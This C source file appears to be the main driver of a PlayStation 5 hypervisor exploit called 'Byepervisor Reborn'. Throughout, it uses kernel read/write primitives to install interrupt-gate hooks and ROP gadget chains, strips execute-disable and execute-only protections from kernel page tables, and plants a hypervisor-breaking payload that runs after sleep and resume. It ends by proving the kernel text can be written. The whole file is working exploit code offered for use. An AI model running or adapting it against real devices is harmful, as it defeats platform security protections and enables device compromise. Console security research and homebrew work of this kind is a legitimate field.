#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/mman.h>

#include <ps5/kernel.h>
#include <sys/syscall.h>

#include "kdlsym.h"
#include "khook.h"
#include "h1160.h"
#include "elog.h"
#include "util.h"
#include "paging.h"
#include "version.h"

#include "break_hv_payload/break_hv.h"

#define STATE_ARMED               0x4B484F4F4B454401ULL // 'KHOOKED.'
#define COOKIE_VAL                0xCAFE133741414141ULL
#define HOOK_CORE                 0
#define HOOK_IST                  6
#define CAVE_STATE_OFF            0x600
#define CAVE_SAVE_OFF             0x620
#define TSS_STRIDE                0x68
#define STARTUP_MP_PAYLOAD_PAGE   0x3FFFF000

#define HV_LOADER_PA_REGULAR      0x062800000
#define HV_LOADER_PA_PRO          0x8e0800000

uint64_t g_hv_base_pa;

static int install_test_hook(int core_id, uint64_t cave)
{
  khook_t    hook;
  kh_chain_t chain;
  uint8_t    chain_buf[0x400];
  int        ret;

  elog("[+] install_test_hook addr = %p\n", &install_test_hook);

  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;

  hook.tss_stride      = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.oneshot   = 1;

  // kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xB);    // 8b4008             mov     eax, dword [rax+0x8]
  // kh_set_resume_rax(&hook, ktext(0x12F61C6));
  // kh_set_resume_skip(&hook, 3);
  // kh_set_resume_rip(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xB + 3); // skip ^^^

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);       // 48898708040000     mov     qword [rdi+0x408], rax
  kh_set_resume_rax(&hook, 0x12345678);
  //kh_set_resume_skip(&hook, 7);
  //kh_set_resume_rip(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE + 7); // skip ^^^

  uint64_t oracle = kh_user_data_addr(&hook);
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  ret = kh_install(&hook, &chain);
  if (ret) return ret;

  kh_trigger(&hook);

  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
  return 0;
}

static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
{
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x800];
  uint64_t set_rsi;
  uint64_t oracle;
  int ret;

  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;

  hook.tss_stride      = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.oneshot   = 1;

  set_rsi = kdldmap(STARTUP_MP_PAYLOAD_PAGE); // our payload
  // set_rsi = ktext(0x269FB8); // original vector (13.60)

  elog("[+] install_resume_hook: setting hook target = 0x%lx (base: 0x%lx), set rsi=0x%lx\n", kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL), ktext(0), set_rsi);
  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  kh_set_resume_rsi(&hook, set_rsi);
  kh_set_resume_rdx(&hook, cr3);

  oracle = kh_user_data_addr(&hook);
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
  kh_chain_q(&chain, cr3);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(&chain, oracle + 0x08);
  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);

  kh_chain_memcpy(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE), kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, 0xF00);

  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF00), kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF08), kdldmap(0));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF10), oracle);

  // carveout addr
  if (g_hv_base_pa == HV_LOADER_PA_PRO)
    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa - 0x800000);
  else
    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa);

  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20), g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), g_hv_base_pa + rawoff(HV_SYM_PCPUS));

  ret = kh_install(&hook, &chain);
  if (ret) return ret;

  kh_trigger(&hook);
  
  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
  return 0;
}

static void uninstall_hook(int core_id, uint64_t cave)
{
  khook_t hook;
  kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.saved_gate_lo = kread64(cave + CAVE_SAVE_OFF + 0x00);
  hook.saved_gate_hi = kread64(cave + CAVE_SAVE_OFF + 0x08);
  hook.saved_ist     = kread64(cave + CAVE_SAVE_OFF + 0x10);
  hook.installed     = 1;
  kh_disarm(&hook);
  kh_restore(&hook);
  kwrite64(cave + CAVE_STATE_OFF, 0);
}

/* ------------------------------------------------------------------ */
/* 11.60 path: hardened multi-core hook + runtime VMCB discovery       */
/* ------------------------------------------------------------------ */

/* Make the AP payload page executable and the kernel .text writable in
 * the guest page tables. Must run BEFORE sleep: repeating page-table
 * preparation after wake is a confirmed 11.60 crash (failure ledger). */
static void prepare_guest_tables(uint64_t *pm_cr3_out)
{
  uint64_t kernel_pmap   = kdlsym(KERNEL_SYM_PMAP_STORE);
  uint64_t kernel_pm_cr3 = kread64(kernel_pmap + 0x28);
  uint64_t pml4e_addr, pdpe_addr, pde_addr, pte_addr;
  uint64_t pml4e, pdpe, pde, pte;

  pml4e_addr = find_pml4e(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pml4e);
  CLEAR_PDE_BIT(pml4e, EXECUTE_DISABLE);
  kwrite64(pml4e_addr, pml4e);

  pdpe_addr = find_pdpe(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pdpe);
  CLEAR_PDE_BIT(pdpe, EXECUTE_DISABLE);
  kwrite64(pdpe_addr, pdpe);

  if (PDE_FIELD(pdpe, PS) != 1) {
    pde_addr = find_pde(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pde);
    CLEAR_PDE_BIT(pde, EXECUTE_DISABLE);
    kwrite64(pde_addr, pde);

    if (PDE_FIELD(pde, PS) != 1) {
      pte_addr = find_pte(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pte);
      CLEAR_PDE_BIT(pte, EXECUTE_DISABLE);
      kwrite64(pte_addr, pte);
    }
  }

  elog("[+] Disabling xotext + enabling write on kernel .text...\n");
  for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE; addr += 0x1000) {
    pde_addr = find_pde(kernel_pmap, addr, &pde);
    if (pde_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pde, XOTEXT);
      SET_PDE_BIT(pde, RW);
      kwrite64(pde_addr, pde);
    }

    pte_addr = find_pte(kernel_pmap, addr, &pte);
    if (pte_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pte, XOTEXT);
      SET_PDE_BIT(pte, RW);
      kwrite64(pte_addr, pte);
    }
  }

  *pm_cr3_out = kernel_pm_cr3;
}

static int run_1160(uint64_t cave, uint64_t oracle)
{
  uint64_t kernel_pm_cr3 = 0;
  uint64_t test_val;
  uint8_t *test_val_bytes;
  int r;

  (void)oracle;

  /* The 11.60 physical layout is surveyed for the regular model only. */
  if (g_hv_base_pa == HV_LOADER_PA_PRO) {
    elog("[!] 11.60 port: PS5 Pro physical layout is not surveyed, exiting\n");
    elog_notify("Byepervisor Reborn\n11.60 port: Pro model not supported :(\n");
    return -1;
  }

  if (pin_to_core(HOOK_CORE) != 0 || get_cpu_core() != 15) {
    elog("[11.60] failed to pin scheduler CPU 15 / TSS index 0\n");
    elog_notify("[ERROR] Byepervisor Reborn\n11.60 core pin failed :(");
    return -1;
  }

  /* Self-heal: a previous payload armed the hook and then died (its host
   * socket went away, or the console rebooted into recovery). Restore the
   * stock gate + IST6 before anything else, so this run can arm cleanly. */
  if (h1160_is_armed(cave)) {
    int cr = h1160_cleanup(cave);
    elog("[11.60] stale armed hook found, cleanup rc=%d\n", cr);
  }

  /* First run after a fresh boot: the HV is already broken if the result
   * blocks from a previous strike survived in the cave. */
  if (h1160_result_success(cave)) {
    elog("Hypervisor is already compromised (11.60 results survived)\n");
    elog("Here's a dump of kernel .text base (xotext defeated)!\n");
    kHexDump(ktext(0), 0x60);
    elog_notify("Byepervisor-pxl\nHypervisor already compromised (results survived)");
    elog_finish();
    return 0;
  }

  /* Forensics: dump residue from a previous (possibly crashed) run before
   * the result blocks are zeroed below. Read-only. */
  h1160_forensics(cave);

  /* Zero the result blocks before arming (parity with the validated
   * PR #7 run_1160): a partial strike from an earlier run must not be
   * misread as a fresh result. */
  {
    uint64_t zeroes[16] = {0};
    kwrite(cave + H1160_ORACLE_OFF, zeroes, 8 * sizeof(uint64_t));
    kwrite(cave + H1160_STASH_OFF, zeroes, 10 * sizeof(uint64_t));
  }

  prepare_guest_tables(&kernel_pm_cr3);
  kwrite64(cave + H1160_PREP_OFF, H1160_PREP_MARK);

  elog("[+] Installing 11.60 hardened hook...\n");
  r = h1160_arm(cave, kernel_pm_cr3, g_hv_base_pa, break_hv, break_hv_len);
  if (r) {
    elog("[!] 11.60 hook arm failed: %d\n", r);
    elog_notify("[ERROR] Byepervisor Reborn\n11.60 hook arm failed :(");
    elog_finish();
    return r;
  }

  elog("[+] 11.60 hook armed, enter sleep and resume!\n");
  elog_notify("Byepervisor Reborn\n11.60 hook armed, enter sleep and resume!\n");

  /* Wait for the AP strike to complete after resume.
   * Heartbeat every 30s of awake time: the host listener uses these lines
   * to distinguish "console is in rest mode" (gap) from "payload died". */
  {
    int waited = 0;
    for (;;) {
      pin_to_core(HOOK_CORE);
      if (h1160_result_done(cave))
        break;
      sceKernelSleep(5);
      waited += 5;
      if (waited % 30 == 0)
        elog("[11.60] armed, waiting for resume/strike... %ds\n", waited);
    }
  }

  elog("[+] Strike finished, uninstalling hook\n");
  r = h1160_cleanup(cave);
  if (r)
    elog("[!] 11.60 hook cleanup failed: %d\n", r);

  h1160_result_print(cave);

  if (h1160_result_success(cave)) {
    test_val = kread64(ktext(0));
    test_val_bytes = (uint8_t *) &test_val;
    elog_notify("Byepervisor Reborn 11.60 - SUCCESS. Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x",
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3],
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);
    kHexDump(ktext(0), 0x60);

    /* .text write canary: prove the kernel text is writable, then restore.
     * Same 4-byte demo spot as the 13.x path (ktext+8). */
    uint32_t canary_before = kread32(ktext(8));
    kwrite32(ktext(8), 0x41414141);
    uint32_t canary_written = kread32(ktext(8));
    kwrite32(ktext(8), canary_before);
    uint32_t canary_restored = kread32(ktext(8));
    elog("[11.60] .text write canary @+8: before=%08x written=%08x restored=%08x\n",
           canary_before, canary_written, canary_restored);
  } else {
    elog_notify("[ERROR] Byepervisor Reborn\n11.60 strike failed, see [11.60] log lines");
  }
  elog_finish();
  return 0;
}

int main(void)
{
  uint64_t test_val;
  uint8_t *test_val_bytes;

  uint32_t fw;
  uint64_t cave;
  uint64_t oracle;
  uint64_t kernel_pm_cr3;
  uint64_t o;

  elog_init();

  elog("[+] Byepervisor-pxl v%s (%s)\n", PXEL_VERSION, PXEL_VARIANT);

  // Do a quick firmware version detect, if we don't have offsets for it, goodbye!
  fw = kernel_get_fw_version();
  elog("[+] Detected firmware: %x.%x\n", (fw & 0xFF000000) >> 0x18, (fw & 0x00FF0000) >> 0x10);

  if (kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) == 0) {
    elog("[!] Undetected firmware, exiting!\n");
    elog_notify("[ERROR] Byepervisor Reborn\nFirmware is not supported :(\n");
  }

  // The hypervisor loader's base physical address changes depending on if its a regular or a pro unit
  int soc_id = sceKernelGetMainSocId();
  if (soc_id == 0x840fd0) {
    g_hv_base_pa = HV_LOADER_PA_PRO;
    elog("[+] Pro model detected, HV loader PA = 0x%lx\n", g_hv_base_pa);
    elog_notify("Byepervisor Reborn\nDetected pro model (0x%x)\n", soc_id);
  } else {
    g_hv_base_pa = HV_LOADER_PA_REGULAR;
    elog("[+] Regular model detected, HV loader PA = 0x%lx\n", g_hv_base_pa);
    elog_notify("Byepervisor Reborn\nDetected regular model (0x%x)\n", soc_id);
  }

  // We need system ucred to pin to core 0
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);

  cave   = kdlsym(KERNEL_SYM_DATA_CAVE);
  oracle = cave + KH_OFF_USER;

  pin_to_core(HOOK_CORE);

  // 11.60: hardened multi-core hook + runtime VMCB discovery
  if ((fw & 0xffff0000) == 0x11600000)
    return run_1160(cave, oracle);

  // This is so we can send the same payload after resume to experiment with post-HV hax (or not if we want to debug the resume payload)
#define DEBUG_MP_STARTUP_PAYLOAD 0
#if DEBUG_MP_STARTUP_PAYLOAD == 0
  if (kread64(oracle) != 0) {
    elog("Hypervisor is already compromised\n");
    elog("Here's a dump of kernel .text base (xotext defeated)!\n");
    kHexDump(ktext(0), 0x60);

    elog("Here's a dump of some HV strings (hvcore+0x19830)!\n");
    kHexDump(kdldmap(g_hv_base_pa + 0x72830), 0x60);

    kwrite64(ktext(8), 0x41414141);

    elog("Edited kernel .text\n");
    kHexDump(ktext(0), 0x60);

    test_val = kread64(ktext(0));
    test_val_bytes = (uint8_t *) &test_val;
    elog_notify("Byepervisor - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);

    return 0;
  }
#endif

#if defined(KHOOK_TEST)
  int ret;

  ret = install_test_hook(HOOK_CORE, cave);
  elog("installed test khook = %d\n", ret);

  elog("1\n");
  sceKernelSleep(1);

  kwrite64(oracle, 0);
  elog("2\n");
  sceKernelSleep(1);

  pin_to_core(HOOK_CORE);
  elog("core = %d\n", get_cpu_core());

  ret = syscall(SYS_getuid);

  o = kread64(oracle);
  elog("test khook oracle=0x%lx (ret = 0x%x)\n", o, ret);
  kwrite64(oracle, 0);
  sceKernelSleep(1);

  ret = syscall(SYS_getuid);

  o = kread64(oracle);
  elog("test khook oracle=0x%lx (ret = 0x%x)\n", o, ret);

  sceKernelSleep(1);

  uninstall_hook(HOOK_CORE, cave);
  elog_notify("uninstalled test khook\n");
  elog_finish();
  return 0;

#else // !KHOOK_TEST

  // Copy our payload that runs from startup_mp into kernel cave
  kwrite(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, break_hv, break_hv_len);

  // Make the payload page executable and defeat xotext on kernel .text
  // (before sleep only)
  prepare_guest_tables(&kernel_pm_cr3);

  // Install hook on startup_mp hypercall
  elog("[+] Installing hook...\n");
  if (kread64(cave + CAVE_STATE_OFF) != STATE_ARMED) {
    int r = install_resume_hook(HOOK_CORE, cave, kernel_pm_cr3);
    if (r) {
      elog("[!] Failed to install hook (likely too large)\n");
      elog_notify("[ERROR] Byepervisor Reborn\nHook install failed :(");
      elog_finish();
      return r;
    }

    elog("[+] Hook installed, enter sleep and resume!\n");
    elog_notify("Byepervisor Reborn\nEnter sleep and resume!\n");
  } else {
    elog("khook: hook already ARMED (state survived)\n");
  }

  // Poll for resume and hook trigger (heartbeat every 30s for the host listener)
  {
    int waited = 0;
  for (;;) {
    pin_to_core(HOOK_CORE);

    o = kread64(oracle);
    if (o != 0) {
      elog_notify("Byepervisor Reborn\nWelcome back, hypervisor is defeated!\nCookie? 0x%lx", o);
      
      elog("[+] Uninstalling hook\n");
      uninstall_hook(HOOK_CORE, cave);

      test_val = kread64(ktext(0));
      test_val_bytes = (uint8_t *) &test_val;
      elog_notify("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);

      // TODO: Patch kernel and all that fun stuff, we don't feel like doing this so someone else can do it :)

      elog_finish();
      return 0;
    }

    sceKernelSleep(5);
    waited += 5;
    if (waited % 30 == 0)
      elog("armed, waiting for resume... %ds\n", waited);
  }
  }
  return 0;
#endif
}
